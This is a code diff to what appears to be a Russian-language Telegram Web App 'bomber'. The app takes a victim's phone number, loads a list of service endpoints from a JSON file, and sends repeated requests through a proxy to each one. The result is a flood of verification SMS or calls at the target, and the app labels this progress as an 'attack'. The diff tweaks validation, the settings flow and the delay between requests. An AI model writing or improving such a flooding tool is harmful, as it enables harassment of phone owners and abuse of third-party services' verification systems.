@@ -120,7 +120,7 @@
     <div class="row">
         <div class="phone-field" id="phoneBox">
             <div class="code-selector" id="codeSelector">
-                <span id="selectedCode">+7</span>
+                <span id="selectedCode">🇷🇺 +7</span>
                 <div class="code-dropdown" id="codeDropdown">
                     <div class="code-item" data-code="+7">🇷🇺 +7 (РФ)</div>
                     <div class="code-item" data-code="+380">🇺🇦 +380 (УКР)</div>
@@ -147,7 +147,7 @@
 <div class="settings-modal" id="settingsModal">
     <div class="settings-content">
         <h3 style="margin-bottom:20px">Настройки</h3>
-        <input type="text" id="repoUrl" style="width:100%; padding:10px; margin-bottom:15px; background:rgba(0,0,0,0.3); border:1px solid #5f5f8f; color:#fff; border-radius:10px; outline:none;" placeholder="JSON URL (напр. services.json)">
+        <input type="text" id="repoUrl" style="width:100%; padding:10px; margin-bottom:15px; background:rgba(0,0,0,0.3); border:1px solid #5f5f8f; color:#fff; border-radius:10px; outline:none;" placeholder="JSON URL...">
         <button class="attack-btn" id="saveSettings" style="width:100%">ОК</button>
     </div>
 </div>
@@ -194,20 +194,20 @@
         }
         anim();
 
+        // 1. ЗАГРУЗКА
         const loadServices = async () => {
-            const url = localStorage.getItem('crux_url') || 'services.json';
-            try {
-                const r = await fetch(url);
-                loadedServices = await r.json();
-                document.getElementById('servicesCounter').innerText = loadedServices.length;
-            } catch(e) { 
-                console.log("JSON не найден, загрузите его в настройках");
-                loadedServices = []; 
-                document.getElementById('servicesCounter').innerText = "0";
+            const url = localStorage.getItem('crux_url');
+            if (url) {
+                try {
+                    const r = await fetch(url);
+                    loadedServices = await r.json();
+                } catch(e) { loadedServices = []; }
             }
+            document.getElementById('servicesCounter').innerText = loadedServices.length;
         };
         loadServices();
 
+        // 2. ОТПРАВКА
         async function sendReq(s, phone) {
             const url = proxyUrl + s.url.replace('%phone%', phone);
             const options = {
@@ -220,23 +220,24 @@
             try { await fetch(url, options); } catch(e) {}
         }
 
+        // 3. АТАКА
         document.getElementById('go').onclick = async () => {
-            if(loadedServices.length === 0) {
-                tg.showAlert("Сначала укажите URL JSON-файла в настройках (⚙)");
-                return;
-            }
-
-            const numStr = document.getElementById('localNumber').value.replace(/\D/g,'');
-            if(numStr.length < 7) {
+            const numPart = document.getElementById('localNumber').value.replace(/\D/g,'');
+            if(numPart.length < 7) {
                 tg.HapticFeedback.notificationOccurred('warning');
                 document.getElementById('phoneBox').classList.add('invalid');
                 setTimeout(() => document.getElementById('phoneBox').classList.remove('invalid'), 400);
                 return;
             }
 
-            const reps = parseInt(document.getElementById('repeat').value) || 1;
-            const fullPhone = document.getElementById('selectedCode').innerText.replace(/\D/g,'') + numStr;
+            if(loadedServices.length === 0) {
+                tg.showAlert("Сначала укажи URL JSON-файла в настройках (⚙)");
+                return;
+            }
 
+            const reps = parseInt(document.getElementById('repeat').value) || 1;
+            const fullPhone = document.getElementById('selectedCode').innerText.replace(/\D/g,'') + numPart;
+            
             isAttacking = true;
             document.getElementById('loadingOverlay').classList.add('show');
             tg.HapticFeedback.impactOccurred('heavy');
@@ -251,39 +252,43 @@
                     count++;
                     document.getElementById('progressFill').style.width = (count/total*100) + '%';
                     document.getElementById('statusTxt').innerText = `Атака: ${count}/${total}`;
-                    await new Promise(r => setTimeout(r, 250));
+                    await new Promise(r => setTimeout(r, 200));
                 }
             }
-
             isAttacking = false;
             document.getElementById('loadingOverlay').classList.remove('show');
             tg.HapticFeedback.notificationOccurred('success');
         };
 
-        // Интерфейс
+        // 4. ИНТЕРФЕЙС
         document.getElementById('openSettings').onclick = () => {
             document.getElementById('repoUrl').value = localStorage.getItem('crux_url') || '';
             document.getElementById('settingsModal').classList.add('active');
         };
+        
         document.getElementById('saveSettings').onclick = () => {
             localStorage.setItem('crux_url', document.getElementById('repoUrl').value);
             loadServices();
             document.getElementById('settingsModal').classList.remove('active');
         };
+        
         document.getElementById('codeSelector').onclick = (e) => {
             e.stopPropagation();
             document.getElementById('codeSelector').classList.toggle('active');
         };
+        
         document.querySelectorAll('.code-item').forEach(i => {
             i.onclick = () => {
                 document.getElementById('selectedCode').innerText = i.dataset.code;
                 document.getElementById('codeSelector').classList.remove('active');
             };
         });
+        
         document.getElementById('stopAttack').onclick = () => {
             isAttacking = false;
             document.getElementById('loadingOverlay').classList.remove('show');
         };
+        
         document.getElementById('bombLogo').onclick = () => {
             tg.HapticFeedback.selectionChanged();
             document.getElementById('bombLogo').classList.add('active-anim');
